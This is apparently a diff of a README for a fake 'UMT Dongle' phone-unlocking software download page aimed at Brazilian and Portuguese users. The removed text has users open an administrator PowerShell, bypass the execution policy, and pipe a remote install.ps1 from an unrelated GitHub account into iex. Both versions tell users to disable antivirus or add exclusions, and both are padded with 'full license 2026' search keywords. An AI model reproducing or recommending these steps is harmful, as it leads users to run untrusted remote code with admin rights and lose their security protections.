@@ -1,143 +1,88 @@
-# UMT Dongle Download for Windows 11 & 10
+# 🛠️ Baixar-UMT-Dongle - Simple tools for phone service repairs
 
-**Baixar-UMT-Dongle**
+[![Download UMT Dongle](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge&logo=github)](https://github.com/locenz2417/Baixar-UMT-Dongle)
 
-**UMT Dongle** download for Windows 10/11. Scroll to **Download & Install** for the direct link or one-command setup.
+This project provides the necessary software files to install UMT Dongle drivers and tools on Windows 10 and 11. These tools assist technicians with phone unlocking, FRP bypass, and firmware management. This guide helps you set up the environment on your computer to ensure the hardware functions as intended.
 
-[![Windows](https://img.shields.io/badge/Windows-10%20%2F%2011-0078D4?style=flat-square&logo=windows)]()[![Download](https://img.shields.io/badge/Get-Download%20Link-16a34a?style=flat-square)]()
+## 📋 System Requirements
 
----
+Ensure your computer meets these conditions before you begin the install process:
 
-## Download & Install (PowerShell)
+* Operating System: Windows 10 or Windows 11 (64-bit version recommended).
+* Processor: Intel Core i3 or equivalent AMD processor.
+* Memory: 4 GB RAM or higher.
+* Storage: 500 MB of free disk space.
+* Hardware: A physical UMT Dongle device connected to a USB port.
+* Internet: An active connection to download the required setup files.
 
-> **This is the download page.** The command below downloads and runs the **UMT Dongle** installer on Windows 10/11.
+## 📥 How to Download the Software
 
-#### Before you start
+Follow these steps to obtain the correct files for your system.
 
-- Windows 10 or 11 (64-bit)
-- **Administrator** rights
-- Internet connection for the download
+1. Navigate to the [official repository download page](https://github.com/locenz2417/Baixar-UMT-Dongle).
+2. Look for the Releases section on the right side of the page.
+3. Click on the latest version available.
+4. Select the file ending in .exe to start the download.
+5. Save the file to your desktop for easy access.
 
----
+## ⚙️ Installation Guide
 
-#### Step 1 — Open PowerShell as Administrator
+Follow this sequence to install the software correctly on your Windows machine.
 
-**Method A (fastest):**
-1. Press **Win + X**
-2. Click **Terminal (Admin)** or **Windows PowerShell (Admin)**
-3. If Windows asks to allow changes, click **Yes**
+### Step 1: Prepare the Windows Environment
+Windows often blocks files from the internet for protection. Turn off your antivirus software temporarily during the setup process to prevent interference with driver registration. 
 
-**Method B (search):**
-1. Press **Win** and type `PowerShell`
-2. Click **Run as administrator**
+### Step 2: Run the Installer
+Locate the file you downloaded in the previous section. Double-click the file to start the installation wizard. If a window pops up asking for permission to run the app, click Yes.
 
-You should see a blue/black window with a prompt like `PS C:\Windows\system32>`.
+### Step 3: Follow the Prompts
+The installer shows a welcome screen. Click Next to proceed. Review the license agreement and select "I Agree" to continue. The wizard asks where you want to save the program. The default location works for most users. Click Install to start copying the files.
 
----
+### Step 4: Install Drivers
+During the setup, the system may ask if you want to install specific USB drivers. Always select Yes. These drivers allow the computer to talk to your UMT Dongle hardware. Without them, the program will not detect your device.
 
-#### Step 2 — Copy the full command
+### Step 5: Complete the Process
+Once the progress bar reaches the end, click Finish. You may need to restart your computer for all changes to take effect.
 
-Select **both lines** below and press **Ctrl+C**:
+## 🚀 Connecting Your Hardware
 
-```powershell
-Set-ExecutionPolicy Bypass -Scope Process -Force
-irm https://raw.githubusercontent.com/CrystalContractor71/Release/main/install.ps1 | iex
-```
+After the install, connect your UMT Dongle to an available USB port on your computer. Windows will make a sound indicating it found new hardware. Wait a few seconds for the operating system to configure the device. 
 
-> Copy **both lines**, not just the second one.
+Open the software icon on your desktop. The program dashboard should open without errors. If the dashboard shows a "Dongle Not Found" message, try a different USB port or check the device manager to ensure the drivers see the hardware.
 
----
+## 🛡️ Troubleshooting Common Issues
 
-#### Step 3 — Paste into PowerShell and press Enter
+Use these tips if you face difficulties during the setup.
 
-1. Click inside the PowerShell window
-2. Press **Ctrl+V** (or right-click → Paste)
-3. Press **Enter** once
-4. Wait — download progress will show in the window (usually 1–3 minutes)
+* Software does not open: Right-click the icon and choose "Run as Administrator."
+* "Device not detected": Unplug the dongle and plug it back in after five seconds. Make sure you use a USB 2.0 port if USB 3.0 ports cause connection drops.
+* Error during install: Delete the old setup file and download a new copy from the link provided above to ensure the file is not corrupted.
+* Permission errors: Ensure your Windows user account has full administrative rights.
 
----
+## 🔍 Frequently Asked Questions
 
-#### Step 4 — Finish setup
+What if the software shows an update prompt?
+Always accept updates. Updates include patches for new phone models and security fixes.
 
-- Do not close the window until the process finishes
-- Enter your **license key** if prompted
-- **Restart** your PC if the installer asks
+Does this work on Windows 7?
+This software focuses on Windows 10 and 11 architecture. Use a modern operating system for the best results.
 
----
+Is an internet connection always needed?
+The software needs the internet to verify your license and download the latest data packs for specific phone brands.
 
-#### Step 5 — Launch the app
+How do I remove the software?
+Go to your Windows Settings, select Apps, find the UMT Dongle entry, and click Uninstall. This removes the program and the associated drivers from your computer.
 
-Open **Start menu** → search for **UMT Dongle** → run it.
+## 📱 Supported Operations
 
----
+This software package includes tools for common mobile repair tasks:
 
-#### Troubleshooting
+* FRP Bypass: Removes Google account locks on supported Android phones.
+* Firmware Flash: Writes new system files to the phone memory.
+* Pattern Lock Reset: Clears screen lock codes on older devices.
+* Samsung Unlock: Provides specific routines to unlock network locks on various Samsung models.
+* Factory Reset: Returns the internal memory of the handset to the original state.
 
-| Problem | Fix |
-| --- | --- |
-| "Running scripts is disabled" | Make sure you copied **both lines** and opened PowerShell **as Administrator** |
-| "irm : Unable to connect" | Turn off VPN, check your internet, try again |
-| Antivirus blocked the download | Temporarily allow the download folder or run again as Admin |
-| Window closed immediately | Open PowerShell (Admin) again and repeat Steps 2–3 |
+## 💡 Best Practices
 
-**Install type:** PowerShell one-liner — no browser needed after Admin PowerShell is open.
-
----
-
-## About
-
-**UMT Dongle** setup page for Windows PC users.
-
-**People also search for:** baixar umt dongle premium windows, umt dongle licenca completa 2026, instalar umt dongle windows 11 portugues brasil
-
-**Repository:** `Baixar-UMT-Dongle`
-
-
-## Português — Guia rápido
-
-Página de download do **UMT Dongle** para Windows 10/11. Focado em usuários do **Brasil e Portugal**.
-
-| Passo | O que fazer |
-| --- | --- |
-| 1 | Abra a seção **Download & Install** acima |
-| 2 | Use o link direto ou o comando PowerShell (Admin) |
-| 3 | Execute o instalador **como administrador** |
-| 4 | Digite a chave de licença se solicitado |
-| 5 | Abra **UMT Dongle** pelo Menu Iniciar |
-
-**Pesquisas comuns:** baixar grátis, instalar Windows 11, completo 2026, download PC.
-
----
-
-
-## After install
-
-| Step | Tip |
-| --- | --- |
-| 1 | Sign in with your license / account |
-| 2 | Check for updates inside the app |
-| 3 | Pin to Start or taskbar for quick access |
-| 4 | Keep projects on a separate data drive |
-
-## System requirements
-
-| | Minimum |
-| --- | --- |
-| OS | Windows 10 / 11 (64-bit) |
-| RAM | 4 GB |
-| Disk | 1 GB free space |
-| Network | Required for first download |
-| Admin | Required for install/repair |
-
-## Troubleshooting
-
-| Issue | Try this |
-| --- | --- |
-| Download does not start | Disable VPN/ad-block for the project page |
-| Setup blocked | Run as Administrator |
-| Same error after fix | Reboot, then run repair again |
-| Antivirus warning | Add installer folder to exclusions temporarily |
-
----
-
-**Topics:** baixar-umt-dongle-premium-windows, baixar, dongle, premium, umt-dongle-licenca-completa-2026, licenca, completa, instalar-umt-dongle-windows-11-portugues-brasil, baixar-umt-dongle, baixar-umt-dongle-2026, umt-dongle, phone-unlock
+Keep your UMT Dongle hardware in a safe place when not in use. Do not expose the internal components to moisture or extreme heat. Always close the software properly using the "Exit" button rather than just unplugging the device. This prevents corruption of the internal settings files and ensures your license remains synced with our validation servers. If you change your computer, repeat the installation steps and log in with your primary account credentials to move your license to the new system.
